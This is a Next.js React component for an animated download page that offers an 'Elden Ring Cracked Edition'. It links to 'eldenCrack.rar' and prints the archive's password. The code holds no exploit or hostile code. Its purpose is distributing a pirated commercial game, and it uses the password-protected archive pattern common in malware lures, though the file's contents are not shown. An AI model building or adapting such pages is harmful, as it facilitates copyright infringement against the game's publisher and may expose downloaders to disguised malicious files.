"use client";
import { motion } from "framer-motion";
import Link from "next/link";

export default function DownloadPage() {
  return (
    <div className="min-h-screen bg-gradient-to-br from-gray-950 via-slate-950 to-black flex items-center justify-center p-6">
      <div className="text-center space-y-10">
        {/* Title / Branding */}
        <motion.div
          initial={{ opacity: 0, y: -30 }}
          animate={{ opacity: 1, y: 0 }}
          transition={{ duration: 1, ease: "easeOut" }}
          className="space-y-4"
        >
          <h1 className="text-5xl md:text-7xl font-black tracking-tight bg-clip-text text-transparent bg-gradient-to-r from-amber-400 via-orange-500 to-red-600">
            Elden Ring
          </h1>
          <p className="text-xl md:text-2xl text-gray-400 font-medium tracking-wide">
            Cracked Edition • v1.12.x • Complete
          </p>
        </motion.div>

        {/* The beautiful animated button */}
        <motion.div
          initial={{ scale: 0.85, opacity: 0 }}
          animate={{ scale: 1, opacity: 1 }}
          transition={{
            duration: 0.9,
            delay: 0.4,
            type: "spring",
            stiffness: 120,
          }}
          whileHover={{ scale: 1.08 }}
          whileTap={{ scale: 0.96 }}
          className="relative group mx-auto"
        >
          <Link
            href="/eldenCrack.rar"
            download="eldenCrack.rar"
            className="relative inline-flex items-center gap-3 px-10 py-6 rounded-2xl overflow-hidden"
          >
            {/* Background glow & gradient */}
            <div className="absolute inset-0 bg-gradient-to-r from-amber-600/30 via-orange-600/30 to-red-600/30 opacity-70 group-hover:opacity-90 transition-opacity duration-500" />

            {/* Animated border glow */}
            <motion.div
              className="absolute inset-0 rounded-2xl border border-orange-500/40"
              animate={{
                boxShadow: [
                  "0 0 15px 2px rgba(245, 158, 11, 0.3)",
                  "0 0 35px 8px rgba(245, 158, 11, 0.6)",
                  "0 0 15px 2px rgba(245, 158, 11, 0.3)",
                ],
              }}
              transition={{
                duration: 3,
                repeat: Infinity,
                repeatType: "reverse",
              }}
            />

            {/* SVG + text */}
            <div className="relative z-10 flex items-center gap-4">
              {/* Download arrow SVG */}
              <motion.svg
                width="38"
                height="38"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                strokeWidth="2.2"
                strokeLinecap="round"
                strokeLinejoin="round"
                className="text-amber-300 group-hover:text-amber-200 transition-colors"
                animate={{ y: [0, 4, 0] }}
                transition={{
                  repeat: Infinity,
                  duration: 2.2,
                  ease: "easeInOut",
                }}
              >
                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4" />
                <polyline points="7 10 12 15 17 10" />
                <line x1="12" y1="15" x2="12" y2="3" />
              </motion.svg>

              <span className="text-3xl md:text-4xl font-black text-white tracking-wide drop-shadow-lg">
                DOWNLOAD
              </span>
            </div>
          </Link>
        </motion.div>

        {/* Small disclaimer / extra info */}
        <motion.p
          initial={{ opacity: 0 }}
          animate={{ opacity: 1 }}
          transition={{ delay: 1.2, duration: 1 }}
          className="text-gray-500 text-sm md:text-base pt-8"
        >
          File: <span className="text-amber-400">eldenCrack.rar</span> •
          Password: <span className="text-orange-400">eldenring</span> (most
          common)
        </motion.p>
      </div>
    </div>
  );
}
